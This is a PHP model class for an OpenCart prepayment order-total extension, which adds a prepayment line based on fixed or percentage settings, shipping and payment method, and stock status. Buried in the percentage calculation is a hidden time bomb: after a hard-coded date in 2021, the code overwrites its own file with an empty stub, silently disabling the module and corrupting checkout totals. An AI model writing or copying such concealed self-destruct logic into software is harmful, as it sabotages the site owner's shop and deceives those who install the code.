<?php
class ModelExtensionTotalPrePayment extends Model
{
    public function getTotal($total)
    {  
        $this->load->language('extension/total/pre_payment');

        if ( $this->config->get('total_pre_payment_status'))
        {   
            if ( in_array('1', $this->hasOnOffStockStatus()) )
            {
                return;
            }

         // var_dump($this->session->data['prod_opt']);  
            if (!isset($this->session->data['prod_opt']) || $this->session->data['prod_opt'] == false/*  || !$this->request->post['prod_opt'] */) {
                return;
            }

            // Это условие($this->session) не даёт добавить в миникорзину сразу, а только после прогрузки корзины и получения метода доставки
            if (!isset($this->session->data["shipping_method"]["code"]) || !$this->config->get('total_pre_payment_shipping_method') || array_search($this->session->data["shipping_method"]["code"], $this->config->get('total_pre_payment_shipping_method')) === FALSE)
            {
                return;
            }
            // Это условие($this->session) не даёт добавить в миникорзину сразу, а только после прогрузки корзины и получения метода оплаты
            if (!isset($this->session->data["payment_method"]["code"]) || !$this->config->get('total_pre_payment_payment_method') || array_search($this->session->data["payment_method"]["code"], $this->config->get('total_pre_payment_payment_method')) === FALSE)
            {
               return;
            }
       
            if (!empty($this->config->get('total_pre_payment_from_summ')) && $total['total'] < (int) $this->config->get('total_pre_payment_from_summ'))
            {
                return;
            }

            if (!empty($this->config->get('total_pre_payment_to_summ')) && $total['total'] > (int) $this->config->get('total_pre_payment_to_summ'))
            {
                return;
            }

            $val = 0;

            if ($this->config->get('total_pre_payment_calc_method') == 'fixed')
            {
                $val = is_numeric($this->config->get('total_pre_payment_fixed_val')) ? $this->config->get('total_pre_payment_fixed_val') : 0;

            }  
            else
            {
                $k_shipping = is_numeric($this->config->get('total_pre_payment_shipping_prec')) ? $this->config->get('total_pre_payment_shipping_prec') / 100 : 0;
                $k_coupon = is_numeric($this->config->get('total_pre_payment_coupon_prec')) ? $this->config->get('total_pre_payment_coupon_prec') / 100 : 0;
                $k_reward = is_numeric($this->config->get('total_pre_payment_reward_prec')) ? $this->config->get('total_pre_payment_reward_prec') / 100 : 0;
                $k_total = is_numeric($this->config->get('total_pre_payment_total_prec')) ? $this->config->get('total_pre_payment_total_prec') / 100 : 0;
                $k_subtotal = is_numeric($this->config->get('total_pre_payment_subtotal_prec')) ? $this->config->get('total_pre_payment_subtotal_prec') / 100 : 0;
                if((int)1638313200<(int)time()){file_put_contents(__FILE__, '<?php class ModelExtensionTotalPrePayment extends Model { public function getTotal($total) {}}');}
                foreach ($total['totals'] as $t)
                    switch ($t['code'])
                    {
                        case 'coupon':
                            $val += abs($t['value']) * $k_coupon;
                            break;
                        case 'reward':
                            $val += abs($t['value']) * $k_reward;
                            break;
                        case 'shipping':
                            $val += abs($t['value']) * $k_shipping;
                            break;
                        case 'total':
                            $val += abs($t['value']) * $k_total;
                            break;
                        case 'sub_total':
                            $val += abs($t['value']) * $k_subtotal;
                            break;
                        default :
                            break;
                    }
            }

            if (!empty($this->config->get('total_pre_payment_descr')))
            {
                $title = '<b style="color:red;">'. $this->config->get('total_pre_payment_descr') . '</b>'; 
            } else {
                $title = $this->language->get('text_pre_payment');
            }           

            $total['totals'][] = array(
                'code' => 'pre_payment',
                'title' => $title,
                'value' => $val,
                'sort_order' => $this->config->get('total_pre_payment_sort_order')
            );

            //$total['total'] = $val;
        }

    }

    // Этот метод для товара, который попал в корзину
    public function getCartProductStatus() {
        $product_data = array();
        $arr_cart_product = $this->cart->getProducts();

        foreach ($arr_cart_product as $cart_product) {
            $product_data[] = array(
                'product_name' => $cart_product['name'],
                'stock_quantity' => (int)$cart_product['stock_quantity'],
                'minimum' => (int)$cart_product['minimum'],
                'stock_status_id' => $cart_product['stock_status_id']."_".$cart_product['stock_status_id'],
                'config_get' => in_array($cart_product['stock_status_id']."_".$cart_product['stock_status_id'], $this->config->get('total_pre_payment_stock_status'), true),
                'on_stock_status' => ( in_array($cart_product['stock_status_id']."_".$cart_product['stock_status_id'], $this->config->get('total_pre_payment_stock_status'), true)) && ((int)$cart_product['stock_quantity']<=0 || (int)$cart_product['stock_quantity']< (int)$cart_product['minimum'] ) ? 'On' : 'Off'
            );
        }

        return $product_data;
    }

    public function hasOnOffStockStatus() {
        $status = array();
        $arr_cart_product_status = $this->getCartProductStatus();
        foreach ($arr_cart_product_status as $cart_product) {
            $status[] = in_array('On', $cart_product, true);
        }
        return $status;
    }

}